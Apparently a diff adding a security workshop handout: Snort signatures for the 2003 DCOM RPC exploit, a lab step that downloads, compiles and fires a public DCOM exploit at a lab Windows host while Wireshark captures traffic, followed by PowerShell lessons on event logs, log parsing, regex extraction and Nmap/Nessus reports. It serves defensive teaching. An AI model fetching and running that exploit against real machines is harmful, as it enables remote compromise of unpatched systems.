+Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 8: MSG - what is actually displayed on the analysts machine
+ 
+ 
+Let's look at 2 simple rules
+----------------------------------------------------------------------------------
+alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:"NETBIOS DCERPC ISystemActivator \
+bind attempt"; flow:to_server,established; content:"|05|"; distance:0; within:1; \
+content:"|0b|"; distance:1; within:1; byte_test:1,&,1,0,relative; content:"|A0 01 00 \
+00 00 00 00 00 C0 00 00 00 00 00 00 46|"; distance:29; within:16; \
+reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)
+ 
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"NETBIOS SMB DCERPC ISystemActivator bind \
+attempt"; flow:to_server,established; content:"|FF|SMB|25|"; nocase; offset:4; \
+depth:5; content:"|26 00|"; distance:56; within:2; content:"|5c \
+00|P|00|I|00|P|00|E|00 5c 00|"; nocase; distance:5; within:12; content:"|05|"; \
+distance:0; within:1; content:"|0b|"; distance:1; within:1; \
+byte_test:1,&,1,0,relative; content:"|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
+46|"; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
+sid:2193; rev:1;)
+----------------------------------------------------------------------------------
+ 
+ 
+ 
+From your Linux machine ping your Windows machine
+---------------------------Type This-----------------------------------
+ping 192.168.150.1
+-----------------------------------------------------------------------
+ 
+ 
+Start wireshark and let's create some simple filters:
+ 
+Filter 1:
+ip.addr==192.168.150.1
+-----------------------------------------------------------------------
+ 
+Filter 2:
+ip.addr==192.168.150.1 && icmp
+-----------------------------------------------------------------------
+ 
+ 
+Filter 3:
+ip.addr==192.168.150.1 && !(tcp.port==22)
+-----------------------------------------------------------------------
+Now stop your capture and restart it (make sure you keep the filter)
+ 
+ 
+ 
+ 
+Back to your Linux machine:
+[ CTRL-C ] - to stop your ping
+ 
+wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c
+ 
+ 
+gcc -o exploit oc192-dcom.c
+ 
+./exploit
+ 
+ 
+./exploit -d 192.168.150.1 -t 0
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Now go back to WireShark and stop the capture.
+
+
+
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+ 
+------------------------Type This------------------------------
+cd c:\
+dir
+cd
+ls
+---------------------------------------------------------------
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+------------------------Type This------------------------------
+Get-Command
+---------------------------------------------------------------
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+------------------------Type This------------------------------
+Get-Alias
+---------------------------------------------------------------
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+------------------------Type This------------------------------
+Get-Process | stop-process              Don't press [ ENTER ] What will this command do?
+Get-Process | stop-process -whatif
+---------------------------------------------------------------
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+------------------------Type This------------------------------
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- Run cmdlet through a pie and refer to its properties as $_
+------------------------Type This------------------------------
+Get-Service | where-object {  $_.Status -eq "Running"}
+---------------------------------------------------------------
+ 
+ 
+ 
+- PowerShell variables begin with the $ symbol. First lets create a variable
+------------------------Type This------------------------------
+$serv = Get-Service –N Spooler
+---------------------------------------------------------------
+ 
+To see the value of a variable you can just call it in the terminal.
+------------------------Type This------------------------------
+$serv
+ 
+$serv.gettype().fullname
+---------------------------------------------------------------
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+------------------------Type This------------------------------
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Let's use a method and a property with our object.
+------------------------Type This------------------------------
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+---------------------------------------------------------------
+ 
+ 
+If you want some good command-line shortcuts you can check out the following link:
+https://technet.microsoft.com/en-us/library/ff678293.aspx
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+------------------------Type This------------------------------
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+---------------------------------------------------------------
+ 
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+------------------------Type This------------------------------
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+------------------------Type This------------------------------
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+---------------------------------------------------------------
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+------------------------Type This------------------------------
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+---------------------------------------------------------------
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+ 
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+------------------------Type This------------------------------
+$seclog | select -first 1 | fl *
+---------------------------------------------------------------
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+------------------------Type This------------------------------
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+---------------------------------------------------------------
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+---------------------------------------------------------------
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+---------------------------------------------------------------
+ 
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
+------------------------Type This------------------------------
+$seclog.Count
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+------------------------Type This------------------------------
+mkdir c:\ps
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+---------------------------------------------------------------
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+---------------------------------------------------------------
+ 
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+------------------------Type This------------------------------
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+---------------------------------------------------------------
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+---------------------------------------------------------------
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+------------------------Type This------------------------------
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+---------------------------------------------------------------
+ 
+ 
+ 
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+ 
+Download the sample IIS log http://pastebin.com/LBn64cyA
+ 
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+---------------------------------------------------------------
+ 
+ 
+The above command would give us all the WebDAV requests.
+ 
+To filter this to a particular user name, use the below command:
+------------------------Type This------------------------------
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+---------------------------------------------------------------
+ 
+ 
+Some more options that will be more commonly required :
+ 
+For Outlook Web Access : Replace WebDAV with OWA
+ 
+For EAS : Replace WebDAV with Microsoft-server-activesync
+ 
+For ECP : Replace WebDAV with ECP
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+####################################################################
+# Windows PowerShell: Extracting Strings Using Regular Expressions #
+####################################################################
+ 
+ 
+Regex Characters you might run into:
+ 
+^   Start of string, or start of line in a multiline pattern
+$   End  of string, or start of line in a multiline pattern
+\b  Word boundary
+\d  Digit
+\   Escape the following character
+*   0 or more   {3} Exactly 3
++   1 or more   {3,}    3 or more
+?   0 or 1      {3,5}   3, 4 or 5
+ 
+ 
+ 
+To build a script that will extract data from a text file and place the extracted text into another file, we need three main elements:
+ 
+1) The input file that will be parsed
+------------------------Type This------------------------------
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=rDN3CMLc", "c:\ps\emails.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=XySD8Mi2", "c:\ps\ip_addresses.txt")
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=v5Yq66sH", "c:\ps\URL_addresses.txt")
+---------------------------------------------------------------
+2) The regular expression that the input file will be compared against
+ 
+3) The output file for where the extracted data will be placed.
+ 
+Windows PowerShell has a "select-string" cmdlet which can be used to quickly scan a file to see if a certain string value exists.
+Using some of the parameters of this cmdlet, we are able to search through a file to see whether any strings match a certain pattern, and then output the results to a separate file.
+ 
+To demonstrate this concept, below is a Windows PowerShell script I created to search through a text file for strings that match the Regular Expression (or RegEx for short) pattern belonging to e-mail addresses.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\emails.txt'
+$output_file = 'c:\ps\extracted_addresses.txt'
+$regex = '\b[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+In this script, we have the following variables:
+ 
+1) $input_path to hold the path to the input file we want to parse
+ 
+2) $output_file to hold the path to the file we want the results to be stored in
+ 
+3) $regex to hold the regular expression pattern to be used when the strings are being matched.
+ 
+The select-string cmdlet contains various parameters as follows:
+ 
+1) "-Path" which takes as input the full path to the input file
+ 
+2) "-Pattern" which takes as input the regular expression used in the matching process
+ 
+3) "-AllMatches" which searches for more than one match (without this parameter it would stop after the first match is found) and is piped to "$.Matches" and then "$_.Value" which represent using the current values of all the matches.
+ 
+Using ">" the results are written to the destination specified in the $output_file variable.
+ 
+Here are two further examples of this script which incorporate a regular expression for extracting IP addresses and URLs.
+ 
+IP addresses
+------------
+For the purposes of this example, I ran the tracert command to trace the route from my host to google.com and saved the results into a file called ip_addresses.txt. You may choose to use this script for extracting IP addresses from router logs, firewall logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\ip_addresses.txt'
+$output_file = 'c:\ps\extracted_ip_addresses.txt'
+$regex = '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+ 
+ 
+URLs
+----
+For the purposes of this example, I created a couple of dummy web server log entries and saved them into URL_addresses.txt.
+You may choose to use this script for extracting URL addresses from proxy logs, network packet capture logs, debug logs, etc.
+------------------------Type This------------------------------
+$input_path = 'c:\ps\URL_addresses.txt'
+$output_file = 'c:\ps\extracted_URL_addresses.txt'
+$regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
+---------------------------------------------------------------
+ 
+In addition to the examples above, many other types of strings can be extracted using this script.
+All you need to do is switch the regular expression in the "$regex" variable!
+In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.
+
+
+
+##########################
+# Parsing Nmap XML Files #
+##########################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip
+ 
+ 
+ 
+ 
+Run Powershell as administrator
+------------------------Type This------------------------------
+cd C:\ps\
+ 
+Get-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted –Force
+---------------------------------------------------------------
+ 
+ 
+Parse nmap XML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml
+---------------------------------------------------------------
+ 
+ 
+Process all XML files
+------------------------Type This------------------------------
+.\parse-nmap.ps1 *.xml
+---------------------------------------------------------------
+ 
+Piping also works
+------------------------Type This------------------------------
+dir *.xml | .\parse-nmap.ps1
+---------------------------------------------------------------
+ 
+Advanced parsing with filtering conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.OS -like "*Windows XP*"} | format-table IPv4,HostName,OS
+---------------------------------------------------------------
+ 
+ 
+More parsing
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
+---------------------------------------------------------------
+ 
+Parsing with match and multiple conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
+---------------------------------------------------------------
+ 
+ 
+CSV Export
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
+---------------------------------------------------------------
+ 
+Import Data from CSV
+------------------------Type This------------------------------
+$data = import-csv weblisteners.csv
+$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
+---------------------------------------------------------------
+ 
+ 
+Export to HTML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
+---------------------------------------------------------------
+ 
+ 
+########################################
+# Parsing Nessus scans with PowerShell #
+########################################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip
+ 
+ 
+ 
+Let's take a look at the Import-Csv cmdlet and what are the members of the object it returns:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | Get-Member
+---------------------------------------------------------------
+ 
+filter the objects:
+ 
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {$_.risk -eq "high"}
+---------------------------------------------------------------
+ 
+use the Select-Object cmdlet and only get unique entries:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique
+ 
+Import-Csv C:\ps\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
+------------------------Type This------------------------------
+ 
+ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
+------------------------Type This------------------------------
+Import-Csv C:\ps\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
+---------------------------------------------------------------
+
+
+
+
+############################################
+# Introduction to scripting and toolmaking #
+############################################
+https://www.youtube.com/watch?v=usiqXcWb978
+ 
+Start the ISE
+ 
+ 
+CTRL+R
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Get-EventLog -LogName application
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+ 
+.\GrabLogs.ps1
+ 
+ 
+------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+$LogName="application"
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+ 
+--- Now run the script ---
+ 
+.\GrabLogs.ps1
+ 
+ 
+------------------------------------------------------------------------------------------------
+ 
+ 
+param(
+    $LogName="application"
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+--- Now run the script ---
+ 
+.\GrabLogs.ps1
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+ 
+.\GrabLogs.ps1 -L[ TAB Key ]
+ 
+.\GrabLogs.ps1 -LogName         (you should now see LogName spelled out)
+ 
+ 
+.\GrabLogs.ps1 -LogName system
+ 
+ 
+------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+param(
+    $LogName="application",
+    $HackCon
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+ 
+.\GrabLogs.ps1 -H[ TAB Key ]
+ 
+.\GrabLogs.ps1 -HackCon         (you should now see HackCon spelled out)
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+ 
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <Object>] [[-HackCon] <Object>]
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+param(
+    [string]$LogName="application",
+    $HackCon
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+ 
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <String>] [[-HackCon] <Object>]
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+param(
+    [string[]]$LogName="application",
+    $HackCon
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+ 
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <String[]>] [[-HackCon] <Object>]
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+ 
+.\GrabLogs.ps1
+ 
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+<#
+ 
+.Synopsis
+This is a just a short explantion of the script
+ 
+.Description
+This is where provide a more information about how to use the script
+ 
+.Parameter LogName
+This is where you specify the names of different logs
+ 
+./Syntax
+GrabLogs.psl -LogName security
+ 
+ 
+.Example
+GrabLogs.psl -LogName security
+ 
+ 
+#>
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+ 
+get-help .\GrabLogs.ps1
+ 
+ 
+ 
+ 
+ 
+ 
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+get-help .\GrabLogs.ps1 -full
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+<#
+ 
+.Synopsis
+This is a just a short explantion of the script
+ 
+.Description
+This is where provide a more information about how to use the script
+ 
+.Parameter LogName
+This is where you specify the names of different logs
+ 
+./Syntax
+GrabLogs.psl -LogName security
+ 
+ 
+.Example
+GrabLogs.psl -LogName security
+ 
+ 
+#>
+function Get-GrabLogs{
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$True)]
+        $LogName
+    )
+    Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+}
